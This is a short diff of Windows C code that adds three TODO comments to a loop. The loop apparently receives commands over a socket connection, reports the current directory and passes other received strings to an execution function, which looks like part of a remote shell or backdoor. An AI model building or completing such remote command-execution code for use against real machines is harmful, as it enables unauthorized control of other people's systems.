@@ -119,6 +119,9 @@ int __cdecl main(int argc, char *argv[]) {
       printf("cwd\n");
       GetCurrentDirectory(MAX_PATH, (LPSTR)&sendbuf);
     } else {
+      // TODO: implement anonymous pipe
+      // dual named pipe setup not working
+      // dealing with File writing issues
       execfunc(recvbuf, ConnectSocket);
       goto skip_write;
     }
